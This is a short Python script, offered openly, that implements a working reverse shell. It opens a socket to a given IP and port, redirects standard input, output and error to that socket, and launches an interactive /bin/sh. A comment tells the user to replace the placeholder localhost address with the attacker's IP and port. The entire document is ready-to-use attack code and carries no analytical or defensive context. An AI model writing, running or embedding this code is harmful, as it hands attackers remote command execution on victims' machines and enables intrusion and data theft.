import os
import socket
import subprocess

def reverse_shell(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        print(f"Error creating reverse shell: {e}")

if __name__ == "__main__":
    # Replace with the attacker's IP and port.
    reverse_shell('127.0.0.1', 4444)
